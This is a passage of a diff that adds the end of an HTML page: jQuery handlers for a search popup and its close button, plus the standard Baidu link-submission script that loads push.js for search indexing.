+      } else {
+        proceedsearch();
+      };
+
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+
+</body>
+</html>
